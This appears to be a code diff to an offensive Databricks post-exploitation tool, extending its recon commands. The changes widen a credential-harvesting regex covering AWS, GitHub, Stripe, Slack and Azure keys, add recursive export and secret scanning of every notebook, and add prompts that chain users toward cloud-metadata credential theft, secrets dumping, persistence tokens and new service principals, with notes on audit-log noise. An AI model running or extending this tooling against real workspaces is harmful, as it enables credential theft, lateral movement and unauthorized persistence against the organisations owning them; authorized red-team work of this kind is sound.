@@ -4,7 +4,7 @@ import re
 import time
 
 from bb.core.db import now_iso, cache_age
-from bb.core.display import console
+from bb.core.display import console, next_step
 from rich import box
 from rich.panel import Panel
 from rich.table import Table
@@ -47,6 +47,9 @@ def run_whoami(w, conn, profile, flags):
             except Exception as e:
                 msg = str(e)[:60]
                 console.print(f"  [red]✗[/red]  {label:<22} [dim]{msg}[/dim]")
+        next_step("recon attack-surface --run",
+                  "uc grants --name <username> --run",
+                  "recon persist-check --run")
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
@@ -76,7 +79,7 @@ def run_cloud_pivot(w, conn, profile, flags):
                 continue
             found += 1
             auto_min  = c.autotermination_minutes or 0
-            last_act  = c.last_activity_time or 0
+            last_act  = c.last_restarted_time or 0
             if auto_min == 0:
                 window = "[green]always-on[/green]"
             else:
@@ -89,7 +92,9 @@ def run_cloud_pivot(w, conn, profile, flags):
 
         if found:
             console.print(t)
-            console.print(f"\n  [dim]{found} pivot target(s). Use 'imds aws --aggressive --cluster <id>'[/dim]")
+            console.print(f"\n  [dim]{found} pivot target(s)[/dim]")
+            next_step("imds aws --cluster <cluster_id> --aggressive --run",
+                      "secrets dump --cluster <cluster_id> --aggressive --run")
         else:
             console.print("[yellow]No running clusters with instance profiles found[/yellow]")
     except Exception as e:
@@ -102,7 +107,16 @@ def run_cred_hunt(w, conn, profile, flags):
     aggressive = flags.get("aggressive", False)
     cred_pat   = re.compile(
         r"(?i)(password|passwd|secret|token|api_?key|access_?key|credential|auth|bearer"
-        r"|dapi[0-9a-f]{32}|AKIA[0-9A-Z]{16})",
+        r"|private_?key|client_?secret|conn(ection)?_?str(ing)?|sas_?token|webhook"
+        # Databricks / AWS
+        r"|dapi[0-9a-f]{32}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}"
+        # GitHub / HuggingFace / Stripe / SendGrid / Slack
+        r"|ghp_[A-Za-z0-9]|ghs_[A-Za-z0-9]|hf_[A-Za-z0-9]"
+        r"|sk_live_|pk_live_|SG\.[A-Za-z0-9_-]|xox[bpas]-"
+        # Azure
+        r"|AccountKey=|DefaultEndpointsProtocol|SharedAccessSignature"
+        r"|azure_client_secret|azure_storage_key|tenantid|clientid"
+        r")",
     )
 
     console.print("\n[bold]Recon: Cred Hunt[/bold]\n")
@@ -133,22 +147,24 @@ def run_cred_hunt(w, conn, profile, flags):
     except Exception as e:
         console.print(f"  [red]{e}[/red]")
 
-    # ── Job spark env vars ──────────────────────────────
-    console.print("[cyan]→ Job spark env vars[/cyan]")
+    # ── Job spark env vars + task base_parameters ───────
+    console.print("[cyan]→ Job env vars / task params[/cyan]")
     try:
         jobs = list(w.jobs.list())
         for j in jobs:
             try:
-                full    = w.jobs.get(job_id=j.job_id)
-                s       = full.settings
+                full     = w.jobs.get(job_id=j.job_id)
+                s        = full.settings
+                jname    = (j.settings.name if j.settings else None) or str(j.job_id)
                 env_vars = {}
-                if s and s.new_cluster and s.new_cluster.spark_env_vars:
+                if s and getattr(s, "new_cluster", None) and s.new_cluster.spark_env_vars:
                     env_vars = s.new_cluster.spark_env_vars
+                for task in (s.tasks if s else []) or []:
+                    if task.notebook_task and task.notebook_task.base_parameters:
+                        env_vars.update(task.notebook_task.base_parameters)
                 for k, v in env_vars.items():
                     if cred_pat.search(k) or cred_pat.search(v or ""):
-                        hits.append(("job-env-var",
-                                     f"{j.settings.name if j.settings else j.job_id}/{k}",
-                                     0, v or ""))
+                        hits.append(("job-env-var", f"{jname}/{k}", 0, v or ""))
             except Exception:
                 pass
         console.print(f"  [dim]{len(jobs)} jobs scanned[/dim]")
@@ -179,10 +195,11 @@ def run_cred_hunt(w, conn, profile, flags):
             queries = list(w.queries.list())
             for q in queries:
                 try:
-                    full = w.queries.get(id=str(q.id))
-                    for i, line in enumerate((full.query or "").splitlines(), 1):
+                    full  = w.queries.get(id=str(q.id))
+                    qname = full.display_name or str(q.id)
+                    for i, line in enumerate((full.query_text or "").splitlines(), 1):
                         if cred_pat.search(line):
-                            hits.append(("saved-query", full.name or str(q.id), i, line.strip()))
+                            hits.append(("saved-query", qname, i, line.strip()))
                 except Exception:
                     pass
             console.print(f"  [dim]{len(queries)} queries scanned[/dim]")
@@ -211,6 +228,40 @@ def run_cred_hunt(w, conn, profile, flags):
         except Exception as e:
             console.print(f"  [red]{e}[/red]")
 
+    if aggressive:
+        # ── Notebook content scan ─────────────────────────
+        scan_path = flags.get("path") or "/"
+        console.print(f"[cyan]→ Notebook content scan[/cyan]  [dim](path={scan_path})[/dim]")
+        console.print("  [dim]Exporting notebooks — may be slow on large workspaces[/dim]")
+        try:
+            import base64
+            from databricks.sdk.service.workspace import ObjectType
+
+            def _walk(path):
+                try:
+                    for obj in w.workspace.list(path=path) or []:
+                        if obj.object_type == ObjectType.DIRECTORY:
+                            yield from _walk(obj.path)
+                        elif obj.object_type in (ObjectType.NOTEBOOK, ObjectType.FILE):
+                            yield obj
+                except Exception:
+                    pass
+
+            nb_count = 0
+            for obj in _walk(scan_path):
+                try:
+                    exported = w.workspace.export(path=obj.path)
+                    content  = base64.b64decode(exported.content or "").decode("utf-8", errors="replace")
+                    for i, line in enumerate(content.splitlines(), 1):
+                        if cred_pat.search(line):
+                            hits.append(("notebook", obj.path, i, line.strip()[:120]))
+                    nb_count += 1
+                except Exception:
+                    pass
+            console.print(f"  [dim]{nb_count} notebooks scanned[/dim]")
+        except Exception as e:
+            console.print(f"  [red]{e}[/red]")
+
     # ── Results ──────────────────────────────────────────
     console.print()
     if hits:
@@ -223,6 +274,8 @@ def run_cred_hunt(w, conn, profile, flags):
         for source, loc, line, value in hits:
             t.add_row(source, loc, str(line) if line else "", value[:80])
         console.print(t)
+        next_step("recon cred-hunt --aggressive --run",
+                  "workspace export --path <notebook_path> --run")
     else:
         console.print("[green]No credential patterns found[/green]")
 
@@ -261,14 +314,17 @@ def run_data_map(w, conn, profile, flags):
         console.print()
 
         if locs:
-            console.print("[bold]External Locations[/bold]")
-            t = Table(box=box.SIMPLE, show_header=True, pad_edge=False)
-            t.add_column("Name",       style="cyan")
-            t.add_column("URL",        style="yellow")
-            t.add_column("Credential")
+            console.print("[bold]External Locations[/bold]\n")
             for loc in locs:
-                t.add_row(loc.name or "?", loc.url or "?", loc.credential_name or "?")
-            console.print(t)
+                t = Table(box=box.SIMPLE, show_header=False, pad_edge=False)
+                t.add_column("", style="dim",   min_width=12)
+                t.add_column("", style="white")
+                t.add_row("Name",       f"[cyan]{loc.name or '?'}[/cyan]")
+                t.add_row("URL",        f"[yellow]{loc.url or '?'}[/yellow]")
+                t.add_row("Credential", loc.credential_name or "?")
+                console.print(t)
+        next_step("uc temp-path-creds --path <url> --run",
+                  "uc schema-meta --catalog <name> --schema <name> --warehouse <id> --run")
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
@@ -318,6 +374,18 @@ def run_persist_check(w, conn, profile, flags):
         t.add_row(option, avail_str, note)
     console.print(t)
 
+    avail_map = {c[0]: c[1] for c in checks}
+    steps = ["persist create-token --run"]
+    if avail_map.get("create-obo-token"):
+        steps.append("persist create-obo-token --id <app_id> --run")
+        steps.append("persist create-service-principal --run")
+    if avail_map.get("imds (exec)"):
+        steps.append("imds aws --cluster <cluster_id> --aggressive --run")
+        steps.append("secrets dump --cluster <cluster_id> --aggressive --run")
+    if avail_map.get("target SPs"):
+        steps.append("identity service-principals --run")
+    next_step(*steps)
+
 
 def run_attack_surface(w, conn, profile, flags):
     """Blast radius assessment — what the current token can do"""
@@ -360,6 +428,133 @@ def run_attack_surface(w, conn, profile, flags):
             t.add_row(label, "[red]No[/red]", f"[dim]{msg}[/dim]")
 
     console.print(t)
+    next_step("recon persist-check --run",
+              "recon cred-hunt --run",
+              "recon cloud-pivot --run")
+
+
+def run_search(w, conn, profile, flags):
+    """Custom pattern search across notebooks, saved queries, job params, and init scripts"""
+    pattern = flags.get("filter") or flags.get("name")
+    if not pattern:
+        pattern = input("Search pattern (regex): ").strip()
+    scan_path = flags.get("path") or "/"
+
+    try:
+        pat = re.compile(pattern, re.IGNORECASE)
+    except re.error as e:
+        console.print(f"[red]Invalid regex: {e}[/red]")
+        return
+
+    console.print(f"\n[bold]Recon: Search[/bold]  [dim]pattern={pattern!r}  path={scan_path}[/dim]\n")
+    hits = []
+
+    # ── Notebooks ─────────────────────────────────────────
+    console.print("[cyan]→ Notebooks[/cyan]")
+    try:
+        import base64
+        from databricks.sdk.service.workspace import ObjectType
+
+        def _walk(path):
+            try:
+                for obj in w.workspace.list(path=path) or []:
+                    if obj.object_type == ObjectType.DIRECTORY:
+                        yield from _walk(obj.path)
+                    elif obj.object_type in (ObjectType.NOTEBOOK, ObjectType.FILE):
+                        yield obj
+            except Exception:
+                pass
+
+        nb_count = 0
+        for obj in _walk(scan_path):
+            try:
+                exported = w.workspace.export(path=obj.path)
+                content  = base64.b64decode(exported.content or "").decode("utf-8", errors="replace")
+                for i, line in enumerate(content.splitlines(), 1):
+                    if pat.search(line):
+                        hits.append(("notebook", obj.path, i, line.strip()[:120]))
+                nb_count += 1
+            except Exception:
+                pass
+        console.print(f"  [dim]{nb_count} notebooks scanned[/dim]")
+    except Exception as e:
+        console.print(f"  [red]{e}[/red]")
+
+    # ── Saved SQL queries ──────────────────────────────────
+    console.print("[cyan]→ Saved queries[/cyan]")
+    try:
+        queries = list(w.queries.list())
+        for q in queries:
+            try:
+                full  = w.queries.get(id=str(q.id))
+                qname = full.display_name or str(q.id)
+                for i, line in enumerate((full.query_text or "").splitlines(), 1):
+                    if pat.search(line):
+                        hits.append(("saved-query", qname, i, line.strip()[:120]))
+            except Exception:
+                pass
+        console.print(f"  [dim]{len(queries)} queries scanned[/dim]")
+    except Exception as e:
+        console.print(f"  [red]{e}[/red]")
+
+    # ── Job env vars / task params ─────────────────────────
+    console.print("[cyan]→ Job params[/cyan]")
+    try:
+        jobs = list(w.jobs.list())
+        for j in jobs:
+            try:
+                full  = w.jobs.get(job_id=j.job_id)
+                s     = full.settings
+                jname = (j.settings.name if j.settings else None) or str(j.job_id)
+                kv    = {}
+                if s and getattr(s, "new_cluster", None) and s.new_cluster.spark_env_vars:
+                    kv.update(s.new_cluster.spark_env_vars)
+                for task in (s.tasks if s else []) or []:
+                    if task.notebook_task and task.notebook_task.base_parameters:
+                        kv.update(task.notebook_task.base_parameters)
+                for k, v in kv.items():
+                    if pat.search(k) or pat.search(v or ""):
+                        hits.append(("job-param", f"{jname}/{k}", 0, v or ""))
+            except Exception:
+                pass
+        console.print(f"  [dim]{len(jobs)} jobs scanned[/dim]")
+    except Exception as e:
+        console.print(f"  [red]{e}[/red]")
+
+    # ── Init scripts ───────────────────────────────────────
+    console.print("[cyan]→ Init scripts[/cyan]")
+    try:
+        import base64 as _b64
+        scripts = list(w.global_init_scripts.list())
+        for s in scripts:
+            try:
+                full    = w.global_init_scripts.get(script_id=s.script_id)
+                content = _b64.b64decode(full.script or "").decode("utf-8", errors="replace")
+                for i, line in enumerate(content.splitlines(), 1):
+                    if pat.search(line):
+                        hits.append(("init-script", s.name or s.script_id, i, line.strip()[:120]))
+            except Exception:
+                pass
+        console.print(f"  [dim]{len(scripts)} scripts scanned[/dim]")
+    except Exception as e:
+        console.print(f"  [red]{e}[/red]")
+
+    # ── Results ────────────────────────────────────────────
+    console.print()
+    if hits:
+        console.print(f"[bold]{len(hits)} match(es)[/bold]\n")
+        t = Table(box=box.SIMPLE, show_header=True, pad_edge=False)
+        t.add_column("Source",   style="dim")
+        t.add_column("Location", style="cyan")
+        t.add_column("Line",     justify="right", style="dim")
+        t.add_column("Match")
+        for source, loc, line, value in hits:
+            t.add_row(source, loc, str(line) if line else "", value)
+        console.print(t)
+        next_step("workspace export --path <notebook_path> --run",
+                  "workspace export --path <notebook_path> --output <file> --run")
+    else:
+        console.print("[green]No matches[/green]")
 
 
 COMMANDS = {
@@ -380,15 +575,31 @@ COMMANDS = {
     "cred-hunt": {
         "description": "Passive credential sweep across init scripts, job env vars, UC connections",
         "activity": ["cred"], "type": "R",
-        "noise": "Medium — one get() per job/connection; High with --extended",
+        "noise": "Medium — one get() per job/connection; High with --extended/--aggressive",
         "prereqs": [],
         "caveats": [
-            "Default: init scripts + jobs + UC connections",
+            "Default: init scripts + jobs (env vars + task params) + UC connections",
             "--extended adds saved SQL queries + serving endpoint env vars",
+            "--aggressive also scans all notebook content (slow on large workspaces)",
         ],
-        "flags": [],
-        "aggressive": ["Secret value extraction via cluster"],
+        "flags": [
+            ("--extended",    "Add saved queries + serving endpoint env vars to scan"),
+            ("--path PATH",   "Limit notebook scan root (--aggressive only, default /)"),
+        ],
+        "aggressive": ["Notebook content export + scan"],
         "fn": run_cred_hunt,
+    },
+    "search": {
+        "description": "Custom regex search across notebooks, saved queries, job params, init scripts",
+        "activity": ["cred", "info"], "type": "R*",
+        "noise": "Medium-High — exports all notebooks under path (R* client-side scan)",
+        "prereqs": [],
+        "caveats": ["Exports notebook content to scan locally — visible in workspace audit logs"],
+        "flags": [
+            ("--filter PATTERN", "Regex pattern to search (prompts if omitted)"),
+            ("--path PATH",      "Workspace path to scan (default /)"),
+        ],
+        "fn": run_search,
     },
     "data-map": {
         "description": "UC topology summary — catalogs, schemas, tables, external locations",
